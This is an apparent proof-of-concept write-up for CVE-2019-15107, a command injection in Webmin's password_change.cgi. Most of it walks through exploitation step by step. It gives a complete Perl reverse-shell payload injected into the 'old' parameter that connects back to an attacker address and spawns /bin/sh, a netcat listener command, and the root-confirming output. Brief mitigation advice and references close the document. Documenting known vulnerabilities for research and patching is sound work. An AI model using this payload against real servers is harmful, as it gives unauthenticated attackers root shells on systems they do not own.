# Proof of Concept: CVE-2019-15107 - Webmin Remote Code Execution (RCE)

## Overview

This Proof of Concept (PoC) demonstrates the exploitation of a critical vulnerability in Webmin (versions 1.882 to 1.921), identified as **CVE-2019-15107**. The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands on the target system due to improper input validation in the **password_change.cgi** script.

- **CVE**: [CVE-2019-15107](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107)
- **Severity**: Critical
- **Platform**: Linux/Unix
- **Vulnerability Type**: Remote Code Execution (RCE)
- **Affected Versions**: Webmin 1.882 to 1.921
- **Patched Version**: Webmin 1.930

## Vulnerability Details

The vulnerability exists in the `password_change.cgi` script, where improper sanitization of the `old` parameter allows an attacker to inject arbitrary commands using the vertical bar (`|`) character, leading to remote command execution.

## Exploitation

### Tools Required:
- Burp Suite or another HTTP interceptor
- Netcat for reverse shell listener

### Steps to Exploit:

1. **Intercept the Request**: 
   Use Burp Suite to intercept the HTTP request made to the `password_change.cgi` script when attempting to change a password on the Webmin server.

2. **Modify the `old` Parameter**: 
   Inject a malicious payload into the `old` parameter of the intercepted request. For this PoC, we will inject a reverse shell payload:

  ```bash
   old=some_password|perl -e 'use Socket;$i="192.168.1.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```

3. **Send the Modified Request**: 
   Send the HTTP request with the malicious payload to the Webmin server via Burp Suite.

   **Burp Suite Command Injection Example:**
   
   ![Burp Suite Command Injection](https://github.com/AhsanA3/Cybersecurity-Technical-Writing/blob/main/Proof%20of%20Concept%20(PoC)/CVE-2019-15107%20-%20Webmin%20Remote%20Code%20Execution%20(RCE)/Picture2.jpg)

4. **Set Up a Netcat Listener**: 
   Before sending the payload, set up a Netcat listener on your machine to catch the reverse shell connection. Run the following command on your attacker machine:

```bash   
nc -lvnp 443
```

5. **Receive the Reverse Shell**: 
   After sending the modified request, if the exploit is successful, you should receive a reverse shell connection on your Netcat listener, granting you root-level access to the Webmin server.

   **Reverse Shell with Root Example:**
   
   ![Reverse Shell with Root](https://github.com/AhsanA3/Cybersecurity-Technical-Writing/blob/main/Proof%20of%20Concept%20(PoC)/CVE-2019-15107%20-%20Webmin%20Remote%20Code%20Execution%20(RCE)/Picture1.jpg)

## Proof of Exploit

Once the reverse shell is established, you can verify the success of the exploit by running the following command on the compromised system:

```bash
id
```
Expected output:

```bash
uid=0(root) gid=0(root) groups=0(root)
```

This confirms that you have successfully gained root privileges on the target machine.

## Mitigation

To mitigate this vulnerability, users should immediately update to Webmin version **1.930**, where this issue has been patched. In addition, the following steps can further secure Webmin installations:

- Enforce strict input validation and sanitization on all user inputs to prevent command injection.
- Ensure Webmin is not exposed to the public internet or is protected by strong network security measures such as a firewall or VPN.
- Regularly update Webmin and apply security patches promptly.

## References

- [CVE-2019-15107 on Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15107)
- [Webmin Release Notes](http://www.webmin.com/changes.html)
- [Exploit-DB Entry](https://www.exploit-db.com/exploits/47293)

---

**Disclaimer**: This PoC is intended for educational and research purposes only.
